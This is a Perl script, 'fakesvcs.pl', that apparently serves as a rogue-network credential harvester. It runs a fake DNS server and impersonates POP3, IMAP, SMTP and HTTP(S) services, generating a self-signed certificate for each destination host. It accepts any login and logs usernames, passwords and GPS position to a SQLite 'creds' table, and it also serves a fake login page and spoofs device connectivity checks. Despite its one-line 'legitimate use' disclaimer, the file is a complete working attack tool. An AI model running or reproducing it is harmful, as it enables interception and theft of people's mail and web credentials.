#!/usr/bin/perl -w

#
# fakesvcs.pl
# adam palmer <adam@sasdataservices.com>
# 14th sept 12
# ammended by reader Jerry 26th Mar 14
#
# sqlite3 ./pwn.db
# SQLite version 3.7.13 2012-06-11 02:05:22
# Enter ".help" for instructions
# Enter SQL statements terminated with a ";"
# sqlite> .schema
# CREATE TABLE creds (id integer primary key autoincrement, dnsid int, svc varchar(8), data varchar(1024), gps varchar (32));
# CREATE TABLE dns(id integer primary key autoincrement, host varchar(255), ip varchar(15));
# CREATE TABLE keyvalue (id integer primary key autoincrement, k varchar(32), v varchar(1024));
#
# This tool is for LEGITIMATE use and research only.
#

use warnings;
use strict;

use POE qw(Component::Server::TCP Filter::Line Component::Server::DNS Filter::SSL Filter::Stream);
use IO::Socket;
use File::Temp qw/ tempfile tempdir /;
use POSIX qw(strftime);
use File::Basename;
use Net::DNS::RR;
use DBI;
use Socket;
use Data::Dumper;

use constant SOL_IP => 0;
use constant SO_ORIGINAL_DST => 80;
use constant DEBUG => 2;
use constant POP3_MSG => 0;
#use constant IMAP4_MSG => 1;
#use constant SMTP_MSG => 1;
use constant SSLkey => "/root/pen/code/svcs.key";
use constant DBNAME => "/root/pen/code/pwn.db";
use constant OPENSSL => '/usr/bin/openssl';
use constant FAKEDNS => 1;
use constant AUDIOALERT => undef;
use constant GPSPATH => '/run/gpsdata';
		
my $dbh = DBI->connect(
	"dbi:SQLite:dbname=" . DBNAME,
	"",
	"",
	{ RaiseError => 1 },
) or die $DBI::errstr;

$|=1;


my %tcpservers = (
        "IMAP4" => { Type => "imap4", Port => 143, SSL => 0 },
        "POP3" => { Type => "pop3", Port => 110, SSL => 0 },
        "SMTP" => { Type => "smtp", Port => 25, SSL => 0 },
        "HTTP" => { Type => "http", Port => 80, SSL => 0 },
        "POP3s" => { Type => "pop3", Port => 995, SSL => 1 },
        "IMAP4s" => { Type => "imap4", Port => 993, SSL => 1 },
        "SMTPs" => { Type => "smtp", Port => 465, SSL => 1 },
        "HTTPs" => { Type => "http", Port => 443, SSL => 1 }
        );

my $bindaddr = "0.0.0.0";
my $mailmsg = <<'EOM';
Return-path: <root@root.com>
Envelope-to: you@victim.com
Delivery-date: Thu, 10 Feb 2011 22:08:59 +0000
Received: from root by root.com with local (Exim 4.67)
	(envelope-from <root@root.com>)
	id 1Pneh9-0005Bi-2i
	for you@victim.com; Thu, 10 Feb 2011 22:08:59 +0000
To: You <you@victim.com>
Message-Id: <E1Pneh9-0005Bi-2i@root.com>
From: root <root@root.com>
Date: Thu, 10 Feb 2011 22:08:59 +0000


Better change your password.. your email account just got compromised..

EOM
$mailmsg =~ s/\r\n/\n/g;
$mailmsg =~ s/\n/\r\n/g;
$mailmsg = $mailmsg .= "\r\n.\r\n";
my $maillen = length($mailmsg);


# -------------- #


foreach my $sname ( keys %tcpservers ) 
{ 
	my $port = $tcpservers{$sname}->{Port};
	my $service = $tcpservers{$sname}->{Type};
	my $ssl = 0;
	if ($tcpservers{$sname}->{SSL} == 1)
	{
		$ssl = 1;
	}

	POE::Component::Server::TCP->new(
		Alias       => $sname,
		Address     => $bindaddr,
		Port        => $port,
		ClientOutputFilter => POE::Filter::Line->new(OutputLiteral => '' ),
		ClientInputFilter  => POE::Filter::Line->new(InputLiteral => ''),
		ClientPreConnect => sub {
			my $socket =  cPreConnect($_[ARG0], $_[HEAP]);
			$_[HEAP]{ssl} = $ssl;
			return $socket;
		},
		ClientConnected => sub {
			processBanner($service, $sname, $_[HEAP]);
		},
		ClientInput => sub {
			my ($kernel, $session, $heap, $input) = @_[KERNEL, SESSION, HEAP, ARG0];
			processInput($kernel, $service, $heap, $input, $sname);
			return;
		},
		ClientDisconnected => sub {
			my ($heap) = $_[HEAP];
			if (defined($heap->{SSLcrt}))
			{
				#if (-e $heap->{SSLcrt}) { unlink $heap->{SSLcrt}; }
			}
		}
	);
}

if (FAKEDNS)
{
	my $dns_server = POE::Component::Server::DNS->spawn( alias => 'dns_server' );

	POE::Session->create(
		package_states => [ 'main' => [ qw(_start dnshandler dnslog) ], ],
	);
}

# ===== subs ====== #

sub _start {
	my ($kernel,$heap) = @_[KERNEL,HEAP];
	$kernel->post( 'dns_server', 'log_event', 'dnslog' );
	$kernel->post( 'dns_server', 'add_handler',
		{
			event => 'dnshandler',
			label => 'all',
			match => '.',
		}
	);
	undef;
}

sub cPreConnect {
	my ($client, $heap, $ssl) = @_;
	my $so_original_dst = getsockopt($client, SOL_IP, SO_ORIGINAL_DST);
	$heap->{dstaddr} = "127.0.0.1";

	if (!defined($so_original_dst))
	{
		if (DEBUG > 1)
		{
			print "Missing SO_ORIGINAL_DST (insmod nat?)\n";
		}
	} else {
		my ( $dport, $dsin_addr ) = unpack_sockaddr_in(substr($so_original_dst, 0, 16));
		$heap->{dstaddr} = inet_ntoa($dsin_addr);
	}

	my $sth = $dbh->prepare("SELECT host FROM dns WHERE ip=?");
	$sth->execute($heap->{dstaddr});
	$heap->{dsthost} = $sth->fetchrow();

	if (!$heap->{dsthost})
	{
		$heap->{dsthost} = $heap->{dstaddr};
	}

	return $client;
}

sub sendToClient {
	my ($heap, $service, $msg) = @_;
	$heap->{client}->put($msg);
	if (DEBUG > 1)
	{
		print $service . " " . $heap->{remote_ip} . " > " . $msg;
	}
}

sub processBanner {
	my ($service, $sname, $heap) = @_;

	$heap->{SSLcrt} = File::Temp->new( TEMPLATE => 'tempXXXXX', DIR => '/tmp', SUFFIX => '.crt');
	my $sslcreate = OPENSSL . ' req -new -x509 -days 365 -key ' . SSLkey . ' -out ' . $heap->{SSLcrt} . ' -subj "/C=US/ST=CA/L=Palo Alto/O=Domain Validation/CN=' . $heap->{dsthost} . '"';
	system($sslcreate);
	if ($heap->{ssl})
	{
		$heap->{client}->set_filter(POE::Filter::SSL->new(crt => $heap->{SSLcrt}, key => SSLkey));
	}

	if ($service eq "pop3")
	{
		sendToClient($heap, $sname, "+OK " . $heap->{remote_ip} . " Welcome to $heap->{dsthost} " . $sname . " Server\r\n");
	} elsif ($service eq "smtp") {
		sendToClient($heap, $sname, "220 " .  $heap->{dsthost} . " ESMTP Sendmail 8.13.8/8.13.8; " . strftime("%a, %d %b %Y %H:%M:%S %z", localtime(time())) . "\r\n");
	} elsif ($service eq "imap4") {
		sendToClient($heap, $sname, '* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION] IMAP4rev1 2001.315rh at ' . strftime("%a, %d %b %Y %H:%M:%S %z", localtime(time())) . "\r\n");
	}
}

sub caughtLogon {
	my ($service, $heap, $dstaddr, $data) = @_;
	if (DEBUG)
	{
		print $service . " " . $heap->{remote_ip} . " " . $dstaddr . " -> " . $data . "\n";
	}

	if (defined(AUDIOALERT))
	{
		system('echo "' . AUDIOALERT . ' ' . $service . '"|/usr/bin/espeak -s 120 >/dev/null 2>&1 &');
	}

	my $dnsid = 0;
	my $sth = $dbh->prepare("SELECT id FROM dns WHERE ip=?");
	$sth->execute($dstaddr);
	$dnsid = $sth->fetchrow();
	if (!$dnsid)
	{
		$sth = $dbh->prepare("INSERT INTO dns (ip) VALUES (?);");
		$sth->execute($dstaddr);
		$dnsid = $dbh->last_insert_id("", "", "dns", "");
	}

	#now we have dnsid

	my $gps = "";
	if (-e GPSPATH)
	{
		open (GPSDATA, GPSPATH);
		while (<GPSDATA>) 
		{
			chomp;
			if ($_ ne "") { $gps = $_; }
	        }
		close (GPSDATA);
	}

	$sth = $dbh->prepare("SELECT COUNT(id) FROM creds WHERE dnsid=? AND svc=? AND data=? AND gps=?");
	$sth->execute($dnsid, $service, $data, $gps);

	my $rowcnt = $sth->fetchrow();
	if (!$rowcnt)
	{
		$sth = $dbh->prepare("INSERT INTO creds (dnsid, svc, data, gps) VALUES (?, ?, ?, ?);");
		$sth->execute($dnsid, $service, $data, $gps);
	}
}
	

sub processInput {
	my ($kernel, $srv, $heap, $input, $service) = @_;
	my @i;

	if (!defined($heap->{pop3_stage}))
	{
		$heap->{pop3_stage} = 0;
	}

	if (DEBUG > 1)
	{
		print "$service" . ": " . $heap->{remote_ip} . ": < " . $input . "\n";
	}

	if ($srv eq "pop3")
	{
		$input =~ s/\r|\n//g;
		@i = split(' ', $input);
		if ($i[0] eq "CAPA")
		{
			sendToClient($heap, $service, "+OK I have some capabilities\r\nUIDL\r\nUSER\r\nLOGIN-DELAY 10\r\nPIPELINING\r\nTOP\r\nIMPLEMENTATION\r\nPWNING\r\n.\r\n");
		} elsif ( ($heap->{pop3_stage} == 0) && ($i[0] eq "USER") && (scalar(@i) == 2) )  {
			$heap->{pop3_user} = $i[1];
			$heap->{pop3_stage}++;
			sendToClient($heap, $service, "+OK Password required for $i[1]\r\n");
		} elsif ( ($heap->{pop3_stage} == 1) && ($i[0] eq "PASS") && (scalar(@i) == 2) ) {
			$heap->{pop3_pass} = $i[1];
			$heap->{pop3_stage}++;
			sendToClient($heap, $service,  "+OK $heap->{pop3_user} you're logged in.\r\n");
			caughtLogon($service, $heap, $heap->{dstaddr}, $heap->{pop3_user} . ":" . $heap->{pop3_pass});

		} elsif ( ($heap->{pop3_stage} == 2) && ($i[0] eq "STAT") ) {
			if (POP3_MSG)
			{
				sendToClient($heap, $service, "+OK 1 $maillen\r\n");
			} else {
				sendToClient($heap, $service, "+OK 0 0\r\n");
			}
		} elsif ( ($heap->{pop3_stage} == 2) && ($i[0] eq "LIST") ) {
			if (POP3_MSG)
			{
				sendToClient($heap, $service, "+OK 1 message\r\n1 $maillen\r\n.\r\n");
			} else {
				sendToClient($heap, $service, "+OK 0 messages\r\n.\r\n");
			}
		} elsif ( ($heap->{pop3_stage} == 2) && ($i[0] eq "RETR") && (scalar(@i) == 2) ) {
			if (POP3_MSG)
			{
				sendToClient($heap, $service, "+OK $maillen octets.\r\n" . $mailmsg);
			} else {
				sendToClient($heap, $service, "-ERR 0 messages\r\n.\r\n");
			}
		} elsif ( ($heap->{pop3_stage} == 2) && ($i[0] eq "NOOP") ) {
			sendToClient($heap, $service, "+OK\r\n");
		} elsif ( ($heap->{pop3_stage} == 2) && ($i[0] eq "UIDL") ) {
			if (POP3_MSG)
			{
				sendToClient($heap, $service, "+OK\r\n1 12345.12345.12345\r\n.\r\n");
			} else {
				sendToClient($heap, $service, "-ERR\r\n");
			}
		} elsif ( ($heap->{pop3_stage} == 2) && ($i[0] eq "DELE") && (scalar(@i) == 2) ) {
			sendToClient($heap, $service, "+OK\r\n");
		} elsif ($i[0] eq "QUIT") {
			sendToClient($heap, $service, "+OK bye\r\n");
			$kernel->yield("shutdown");
		} else {
			sendToClient($heap, $service, "-ERR Unknown command\r\n");
		}
	} elsif ($srv eq "imap4") {
		$input =~ s/\r|\n//g;
		@i = split(' ', $input);
		$heap->{imap4_stage} = $i[0];

		if (!defined($i[1]))
		{
			$i[1] = "";
		}
	
		if (!defined($heap->{imap4_login_stage}))
		{
			$heap->{imap4_login_stage} = 0;
		}

		if ( ($heap->{imap4_login_stage} == 0) && ($i[1] eq "LOGIN") && (scalar(@i) > 2) )
		{
			sendToClient($heap, $service, $heap->{imap4_stage} . " OK User $i[2] authenticated\r\n");
			$heap->{imap4_login_stage}++;
			caughtLogon($service, $heap, $heap->{dstaddr}, $i[2] . ":" . $i[3]);
		} elsif ( ($heap->{imap4_login_stage} == 1) && ($i[1] eq "IDLE") ) {
			sendToClient($heap, $service, "+ entering idle mode\r\n");
			$heap->{imap4_idlestage} = $heap->{imap4_stage};
		} elsif ( ($heap->{imap4_login_stage} == 1) && ($i[0] eq "DONE") ) {
			sendToClient($heap, $service, $heap->{imap4_idlestage} . " OK IDLE completed\r\n");
		} elsif ( ($i[1] eq "CAPABILITY") ) {
			sendToClient($heap, $service, "* CAPABILITY CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION\r\n");
			sendToClient($heap, $service, $heap->{imap4_stage} . " OK CAPABILITY completed\r\n");
		} elsif ( ($heap->{imap4_login_stage} == 1) && ($i[1] eq "NOOP") ) {
			sendToClient($heap, $service, $heap->{imap4_stage} . " OK NOOP completed\r\n");
		} elsif ( ($heap->{imap4_login_stage} == 1) && ($i[1] eq "LOGOUT") ) {
			sendToClient($heap, $service, $heap->{imap4_stage} . " OK LOGOUT completed\r\n");
			$kernel->yield("shutdown");
		} else {
			if (!defined($heap->{imap4_stage})) { $heap->{imap4_stage} = ""; }
			sendToClient($heap, $service, $heap->{imap4_stage} . " NO I can\'t\r\n");
		}
	} elsif ($srv eq "http") {
		my @l = split('\n', $input);
		my $count = 0;
		if (scalar(@l) == 0) { @l = " "; }
		for ($count = 0; $count < scalar(@l); $count++) 
		{
			$l[$count] =~ s/\r|\n//g;
			@i = split(' ', $l[$count]);
			if (!defined($heap->{httpreqmade})) 
			{
				$heap->{httpreqmade} = 0;
			}
			if (!defined($heap->{httpcheaders})) 
			{
				$heap->{httpcheaders} = "";
			}
			if ($i[0] eq "ET") { $i[0] = "GET"; }

			if ( (scalar(@i) == 3) && ( ($i[0] eq "GET") || ($i[0] eq "POST") ) ) 
			{
				$heap->{httpmethod} = $i[0];
				$heap->{url} = $i[1];
				$heap->{httpver} = $i[2];
				$heap->{httpreqmade} = 1;
			} elsif ($heap->{httpreqmade} == 1) {
				if ( ($l[$count] eq "") || ($input eq "") )
				{
					#now time to log and send a 200 back
					my $httppage;
					caughtLogon($service, $heap, $heap->{dstaddr}, 
					$heap->{url} . " " . $heap->{httpmethod} . "->" . $heap->{httpcheaders});
	
					if ( ($heap->{url} eq "/library/test/success.html") && ($heap->{httpmethod} eq "GET") && ($heap->{httphost} eq "www.apple.com") )
					{
						$httppage = '<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>' . "\r\n";
					} elsif (($heap->{url} eq "/select/wifiloginsuccess/") && ($heap->{httpmethod} eq "GET") && ($heap->{httphost} eq "www.blackberry.com") ) {
						$httppage = '<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache" />' . "\n" 
						. '<META HTTP-EQUIV="Pragma" CONTENT="no-cache" />' . "\n\n"
						. '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"' . "\n"
						. '"http://www.w3.org/TR/html4/loose.dtd">' . "\n"
						. '<html>' . "\n" . '<head>' . "\n" . '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">' . "\n"
						. '<meta name="HandheldFriendly" content="true">' . "\n"
						. '<title>BlackBerry | Now Connected</title>' . "\n" . '</head>' . "\n\n" . '<body>' . "\n"
						. '<!-- Do not remove: 74dfa016-f57e-4b3a-bf33-a817b00c44a2 -->' . "\n\t\n\t" . '<meta http-equiv="refresh" content="0;url=EN/">' . "\n\t\n\n\n" . '</body>' . "\n" . '</html>' . "\r\n";
					} elsif (($heap->{url} eq "/pep/gcc") && ($heap->{httpmethod} eq "GET") && ($heap->{httphost} eq "gsp1.apple.com") ) {
						$httppage = "\r\n" . 'GB' . "\r\n";
					} else {
						$httppage = '<HTML><HEAD><TITLE>Welcome</TITLE></HEAD><BODY><p>Please Log In:</p>'
							. '<form method="POST" action="/fakeloginpage.php">'
							. '<table><tr><td>Username:</td><td><input type="text" name="user" /></td></tr>'
							. '<tr><td>Password:</td><td><input type="password" name="pass" /></td></tr>'
							. '<tr><td></td><td><input type="submit" value="Login" /></td></tr>'
							. '</table></form></BODY></HTML>' . "\r\n";
					}
	
					my $httpresp = $heap->{httpver} . " 200 OK\r\n"
						. "Date: " . strftime("%a, %d %b %Y %H:%M:%S %z", localtime(time())) . "\r\n"
						. "Server: PwnYou/1.0.1\r\n"
						. "Last-Modified: " . strftime("%a, %d %b %Y %H:%M:%S %z", localtime(time()-1)) . "\r\n"
						. "Content-Length: " . length($httppage) . "\r\n"
						. "Accept_Ranges: bytes\r\n"
						. "Content-Type: text/html\r\n"
						. "\r\n";
					sendToClient($heap, $service, $httpresp . $httppage);
					$kernel->yield("shutdown");
				} else {
					#client now sending his headers. log them all
					@i = split(' ', $input);
					if ($i[0] eq "Host:")
					{
						$heap->{httphost} = $i[1];
					}	
					$heap->{httpcheaders} = $heap->{httpcheaders} . $input;
				}
			}
		}
	} elsif ($srv eq "smtp") {
		$input =~ s/\r|\n//g;
		@i = split(' ', $input);
		if (!defined($heap->{smtpdata}))
		{
			$heap->{smtpdata} = "";
		}
		if (!defined($i[0]))
		{
			$i[0] = "";
		}

		if ($i[0] eq "DATA")
		{
			sendToClient($heap, $service, '354 enter mail, end with line containing only "."' . "\r\n");
			$heap->{insmtpdata} = 1;
		} elsif ($i[0] eq "AUTH") {
			if ($i[1] eq "PLAIN")
			{
				$heap->{smtpdata} = $heap->{smtpdata} . $input;
				caughtLogon($service, $heap, $heap->{dstaddr}, $i[2]);
			} elsif ($i[1] eq "LOGIN") {
				if (defined($i[2]))
				{
					$heap->{smtpuser} = $i[2];
					sendToClient($heap, $service, '334 UGFzc3dvcmQ6' . "\r\n");
				} else {
					sendToClient($heap, $service, '334 VXNlcm5hbWU6' . "\r\n");
				}
				$heap->{smtpinauth} = 1;
			} else {
				sendToClient($heap, $service, '504 No thanks' . "\r\n");
			}
		} elsif ($i[0] eq "EHLO") {
			sendToClient($heap, $service, '250-' . $heap->{dstaddr} . ' Hello ' . $i[1] . '[' . $heap->{remote_ip} . ']' . "\r\n");
			sendToClient($heap, $service, '250-PIPELINING' . "\r\n");
			sendToClient($heap, $service, '250-8BITMIME' . "\r\n");
			sendToClient($heap, $service, '250-SIZE 255555555' . "\r\n");
			sendToClient($heap, $service, '250-AUTH LOGIN' . "\r\n");
			sendToClient($heap, $service, '250 HELP' . "\r\n");
			$heap->{smtpdata} = $heap->{smtpdata} . $input
		} elsif ($i[0] eq "QUIT") {
			sendToClient($heap, $service, '221 thanks for the presents' . "\r\n");
			caughtLogon($service, $heap, $heap->{dstaddr}, $heap->{smtpdata});
			$kernel->yield("shutdown");
		} else {
			if ($heap->{smtpinauth})
			{
				if ($heap->{smtpuser})
				{
					$heap->{smtppass} = $input;
					caughtLogon($service, $heap, $heap->{dstaddr}, $heap->{smtpuser} . ":" . $heap->{smtppass});
					sendToClient($heap, $service, "235 credentials logged. Now for the email" . "\r\n");
					$heap->{smtpinauth} = 0;
				} else {
					$heap->{smtpuser} = $input;
					sendToClient($heap, $service, '334 UGFzc3dvcmQ6' . "\r\n");
				}
			} else {
				if ($heap->{insmtpdata})
				{
					if ($input eq ".")
					{
						sendToClient($heap, $service, "250 OK delivered" . "\r\n");
						$heap->{insmtpdata} = 0;
					}
				} else {
					sendToClient($heap, $service, "250 OK keep it coming" . "\r\n");
				}
			}
		}
		$heap->{smtpdata} = $heap->{smtpdata} . $input
	}
}

sub dnshandler {
	my ($heap, $qname,$qclass,$qtype,$callback) = @_[HEAP, ARG0..ARG3];
	my ($rcode, @ans, @auth, @add);

	if ($qtype eq "A") 
	{
		#connected to db

		if (!defined($heap->{octets_set}))
		{
			my $sth = $dbh->prepare("SELECT v FROM keyvalue WHERE k='lastdns';");
			$sth->execute();
			my $lastip = $sth->fetchrow();
			if ($lastip)
			{			
				#we have a last ip stored

		                my @octets = split('\.', $lastip);
				$heap->{octet_a_ctr} = $octets[0];
				$heap->{octet_b_ctr} = $octets[1];
				$heap->{octet_c_ctr} = $octets[2];
				$heap->{octet_d_ctr} = $octets[3] + 1;
			} else {
				$heap->{octet_a_ctr} = 11;
				$heap->{octet_b_ctr} = 1;
				$heap->{octet_c_ctr} = 1;
				$heap->{octet_d_ctr} = 1;
				my $sth = $dbh->prepare("INSERT INTO keyvalue (k,v) VALUES ('lastdns', '11.1.1.1');");
				$sth->execute();
			}
			if (!defined($heap->{octet_a_max})) { $heap->{octet_a_max} = 99; }
			if (!defined($heap->{octet_b_max})) { $heap->{octet_b_max} = 250; }
			if (!defined($heap->{octet_c_max})) { $heap->{octet_c_max} = 250; }
			if (!defined($heap->{octet_d_max})) { $heap->{octet_d_max} = 250; }
			$heap->{octets_set} = 1;
		}
		my $ttl = 3600;
		my $rdata;

		#select and use or insert..
		my $sth = $dbh->prepare("SELECT ip FROM dns WHERE host=?");
		$sth->execute($qname);
		$rdata = $sth->fetchrow();

		if (!$rdata)
		{
			$rdata = $heap->{octet_a_ctr} . "." . $heap->{octet_b_ctr} . "." . $heap->{octet_c_ctr} . "." . $heap->{octet_d_ctr};
			my $sth = $dbh->prepare("INSERT INTO dns (host, ip) VALUES (?, ?);");
			$sth->execute($qname, $rdata);

			#increment the IP counters
			if ($heap->{octet_a_ctr} >= $heap->{octet_a_max})
			{
				#ummm?
				$heap->{octet_a_ctr} = 11;
			}

			if ($heap->{octet_b_ctr} >= $heap->{octet_b_max})
			{
				$heap->{octet_b_ctr} = 1;
				$heap->{octet_a_ctr}++;
			}
			if ($heap->{octet_c_ctr} >= $heap->{octet_c_max})
			{
				$heap->{octet_c_ctr} = 1;
				$heap->{octet_b_ctr}++;
			}
			if ($heap->{octet_d_ctr} >= $heap->{octet_d_max})
			{
				$heap->{octet_d_ctr} = 1;
				$heap->{octet_c_ctr}++;
			} else {
				$heap->{octet_d_ctr}++;
			}
			$sth = $dbh->prepare("UPDATE keyvalue SET v='" . $heap->{octet_a_ctr} . "." . $heap->{octet_b_ctr} . "." . $heap->{octet_c_ctr} . "." . $heap->{octet_d_ctr} . "' WHERE k='lastdns';");
			$sth->execute();

		}	

		$sth->finish();

		push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
		$rcode = "NOERROR";
	} else {
		$rcode = "NXDOMAIN";
	}
	$callback->($rcode, \@ans, \@auth, \@add, { aa => 1 });
	undef;
}

sub dnslog {
	my ($ip_port,$net_dns_packet) = @_[ARG0..ARG1];
	#$net_dns_packet->print();
	undef;
}

print "Ready...\n";
$poe_kernel->run();

$dbh->disconnect();

exit 0;
